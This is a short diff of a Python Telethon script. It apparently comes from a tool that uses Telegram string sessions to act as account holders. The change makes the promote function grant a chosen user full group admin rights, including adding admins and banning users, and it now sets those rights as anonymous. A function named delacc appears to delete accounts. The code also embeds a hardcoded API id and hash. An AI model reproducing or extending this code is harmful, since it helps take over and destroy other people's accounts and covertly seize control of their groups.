@@ -66,7 +66,7 @@ async def delacc(strses):
 async def promote(strses, grp, user):
   async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
     try:
-      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, pin_messages=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
+      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, pin_messages=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True, anonymous=True)
     except:
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
